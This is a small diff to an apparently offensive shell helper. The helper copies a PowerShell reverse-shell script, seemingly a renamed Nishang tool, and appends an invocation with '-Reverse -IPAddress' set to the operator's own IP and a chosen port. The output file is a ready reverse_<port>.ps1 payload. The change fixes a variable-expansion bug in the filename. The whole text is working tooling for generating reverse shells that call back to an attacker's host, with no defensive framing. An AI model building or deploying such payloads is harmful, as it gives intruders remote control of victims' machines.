@@ -5,6 +5,6 @@ if [ $# -eq 0 ]; then
 fi
 IP=$( IP_No_Clip );                      
 New_IP=$( echo -n $IP );                                                                                                              
-cp /home/kali/Ops/Tools/brwn-shoe-crew-n1$hang.ps1 .;
-echo "brwn-shoe-crew-n1$hang -Reverse -IPAddress $New_IP -Port $1" >> brwn-shoe-crew-n1$hang.ps1;
-mv brwn-shoe-crew-n1$hang.ps1 reverse_$1.ps1
+cp /home/kali/Ops/Tools/brwn-shoe-crew-n1shang.ps1 .;
+echo "brwn-shoe-crew-n1shang -Reverse -IPAddress $New_IP -Port $1" >> brwn-shoe-crew-n1shang.ps1;
+mv brwn-shoe-crew-n1shang.ps1 reverse_$1.ps1
